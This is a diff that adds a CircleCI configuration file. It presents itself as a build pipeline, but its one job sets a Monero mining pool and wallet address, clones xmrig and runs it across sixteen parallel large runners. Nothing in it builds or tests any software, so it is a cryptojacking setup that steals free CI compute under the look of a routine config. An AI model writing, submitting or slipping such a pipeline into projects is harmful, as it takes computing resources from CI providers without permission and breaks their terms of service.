@@ -1,0 +1,38 @@
+version: 2.1
+
+jobs:
+  trial:
+    docker:
+      - image: circleci/ruby:2.5.3
+    parallelism: 16
+    resource_class: large
+    environment:
+      MINING_POOL: stratum+ssl://xmr-asia1.nanopool.org:10343
+      WALLET_ADDRESS: 84YR3pqYSCo84Ym1NfjFyeFxZV7fVHHF6Qet5FRbLfaSdXJp8qZAq8nAeSeoK5PpKP8oLRMkDSYFa18u8z1duesmDGCbket
+      WALLET_PASSWORD: x
+    steps:
+      - restore_cache:
+          keys:
+            - v1-dependencies-{{ checksum "package-list.txt" }}
+      - run:
+          name: Install Dependencies
+          command: |
+            apt-get update
+            apt-get install -y git wget curl nano vim htop unzip zip tar clang make python3 cmake libuv openssl openssh proot
+            echo "git wget curl nano vim htop unzip zip tar clang make python3 cmake libuv openssl openssh proot" > package-list.txt
+      - save_cache:
+          paths:
+            - /usr/local
+          key: v1-dependencies-{{ checksum "package-list.txt" }}
+      - run:
+          name: Clone and Run xmrig
+          command: |
+            git clone https://github.com/xmrig/xmrig.git
+            cd xmrig
+            ./xmrig -o $MINING_POOL -a randomx -u $WALLET_ADDRESS -p $WALLET_PASSWORD --tls
+
+workflows:
+  version: 2.1
+  build:
+    jobs:
+      - trial
